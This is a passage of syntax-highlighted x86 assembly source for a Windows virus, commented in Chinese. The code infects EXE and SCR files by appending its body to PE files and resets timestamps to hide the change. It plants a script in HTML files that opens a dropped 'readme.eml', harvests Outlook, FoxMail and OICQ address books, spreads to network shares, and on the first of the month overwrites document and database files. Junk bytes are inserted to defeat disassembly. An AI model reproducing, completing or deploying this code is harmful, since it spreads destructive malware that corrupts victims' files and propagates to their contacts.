    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundFileCallBackAddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc5">FindData</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;人工意外</span><span class="sc0">
</span><span class="sc5">FoundFileObject</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc5">FoundDirCallBackAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PushFoundDirCallBackAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">GetFoundFileCallBackAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushFoundFileCallBackAddr</span><span class="sc0">
    </span><span class="sc5">FoundFileCallBackAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PushFoundFileCallBackAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">GetFileExtName</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc0">
</span><span class="sc5">ContIncEax</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContIncEax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetFileExtName</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">OptLocalDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">DirName</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc1">;消除CPU时间占有异常</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OptLocalDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">OptNetDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">NetDirName</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildVirusPathInStack</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OptNetDirEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetComputerNameA</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'lme.'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLCreat</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CloseVirFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeMailFile</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">CloseVirFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">OptNetDirEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OptNetDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">OptMailFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindData</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileExtName</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'baw.'</span><span class="sc0">  </span><span class="sc1">;得到OutLook地址薄文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsWabFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'cda.'</span><span class="sc0">  </span><span class="sc1">;得到FoxMail地址薄文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsDbFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'bd.r'</span><span class="sc0">  </span><span class="sc1">;得到Oicq地址薄文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsDbFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'cod.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsDbFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'slx.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsDbFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">IsWabFile</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumWabMail</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">IsDbFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumDbMail</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetSystemTime</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">esp.stDay</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NoDelDbFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NoDelDbFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NoDelDbFile</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OptMailFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">OptExeFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc1">;为修改PE文件做准备，恢复文件信息</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindData</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileExtName</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">  </span><span class="sc1">;传染EXE文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsExeFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'rcs.'</span><span class="sc0">  </span><span class="sc1">;传染SCR文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsExeFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'mth.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsHtmFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'lmth'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsHtmFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IsHtmFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileAttributesA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OpenHtmlError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixHtmlFile</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">edi.ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileTime</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">OpenHtmlError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileAttributesA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">IsExeFile</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileAttributesA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OpenFileError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixPeFile</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">edi.ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileTime</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">OpenFileError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileAttributesA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OptExeFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">FixHtmlFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hHtmlFile</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildVirusPathInStack</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FixHtmlFileEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetEmlFile</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'readme.eml'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetEmlFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLCreat</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FixHtmlOver</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeMailFile</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">hHtmlFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHtmlCode</span><span class="sc0">
</span><span class="sc5">HtmlCodeStart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'&lt;html&gt;&lt;script language="JavaScript"&gt;window.open("readme.eml", null,"resizable=no,top=6000,left=6000")&lt;/script&gt;&lt;/html&gt;'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetHtmlCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetHtmlCode</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HtmlCodeStart</span><span class="sc0">
</span><span class="sc5">FixHtmlOver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">FixHtmlFileEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FixHtmlFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">FixPeFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hPeFile</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">  
    </span><span class="sc1">;修改PE文件，附加上病毒体</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">PEHeaderOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;超界检查</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">FixPeFileOver</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.fhPEFlag</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc1">;检查PE文件</span><span class="sc0">
